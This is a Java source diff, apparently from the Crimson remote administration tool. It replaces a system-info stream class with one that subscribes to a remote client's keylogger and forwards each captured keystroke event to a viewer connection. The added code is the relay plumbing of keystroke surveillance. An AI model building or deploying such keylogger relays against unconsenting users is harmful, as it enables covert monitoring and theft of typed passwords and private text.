@@ -15,27 +15,28 @@
  *  limitations under the License.                                            *
  *                                                                            *
  *****************************************************************************/
-package com.subterranean_security.crimson.core.stream.info;
+package com.subterranean_security.crimson.core.stream.subscriber;
 
 import com.subterranean_security.crimson.core.Common;
-import com.subterranean_security.crimson.core.Platform;
-import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
-import com.subterranean_security.crimson.core.proto.Stream.InfoParam;
 import com.subterranean_security.crimson.core.proto.Stream.Param;
+import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
 import com.subterranean_security.crimson.core.stream.Stream;
 import com.subterranean_security.crimson.core.util.IDGen;
-import com.subterranean_security.crimson.core.util.Native;
+import com.subterranean_security.crimson.server.ServerStore;
+import com.subterranean_security.crimson.sv.ClientProfile;
+import com.subterranean_security.crimson.sv.keylogger.LogCallback;
 
-public abstract class InfoSlave extends Stream {
+public class SubscriberSlave extends Stream {
 
-	public InfoSlave(Param p) {
+	public SubscriberSlave(Param p) {
 		param = p;
 		start();
 	}
 
-	public InfoSlave(InfoParam ip) {
-		this(Param.newBuilder().setInfoParam(ip).setStreamID(IDGen.getStreamid()).setVID(Common.cvid).build());
+	public SubscriberSlave(SubscriberParam sp) {
+		this(Param.newBuilder().setSubscriberParam(sp).setStreamID(IDGen.getStreamid()).setVID(Common.cvid).build());
 	}
 
 	@Override
@@ -43,44 +44,31 @@ public abstract class InfoSlave extends Stream {
 		// do nothing
 	}
 
-	protected EV_ProfileDelta gatherDefaultInfo() {
-		EV_ProfileDelta.Builder pd = EV_ProfileDelta.newBuilder().setCvid(Common.cvid);
-		if (param.getInfoParam().hasActiveWindow()) {
-			pd.setActiveWindow(Native.getActiveWindow());
-		}
-		if (param.getInfoParam().hasCpuSpeed()) {
-			for (double d : Platform.Advanced.getCPUSpeed()) {
-				pd.addCoreSpeed(d);
-			}
-
-		}
-		if (param.getInfoParam().hasCpuUsage()) {
-			pd.setCoreUsage(Platform.Advanced.getCPUUsage());
-		}
-		if (param.getInfoParam().hasCpuTemp()) {
-			long temp = Platform.Advanced.getCPUTemp();
-			pd.setCpuTemp(temp == 0 ? "unknown" : "" + temp);
-		}
-		if (param.getInfoParam().hasCrimsonRamUsage()) {
-			pd.setCrimsonRamUsage(Platform.Advanced.getCrimsonMemoryUsage());
-		}
-		if (param.getInfoParam().hasCrimsonCpuUsage()) {
-			pd.setCrimsonCpuUsage(Platform.Advanced.getCrimsonCpuUsage());
-		}
-		return pd.build();
+	@Override
+	public void send() {
+		// do nothing
 	}
 
 	@Override
 	public void start() {
 
-		timer.schedule(sendTask, 0, param.hasPeriod() ? param.getPeriod() : 1000);
+		if (param.getSubscriberParam().getKeylog()) {
+			ClientProfile cp = ServerStore.Profiles.getClient(param.getCID());
+
+			cp.getKeylog().addCallback(new LogCallback(this));
+		}
 
 	}
 
 	@Override
 	public void stop() {
-		timer.cancel();
+		// TODO remove callbacks
 
+	}
+
+	public void trigger(EV_KEvent k) {
+		ServerStore.Connections.getConnection(param.getVID()).handle
+				.write(Message.newBuilder().setUrgent(true).setSid(param.getCID()).setEvKevent(k).build());
 	}
 
 }
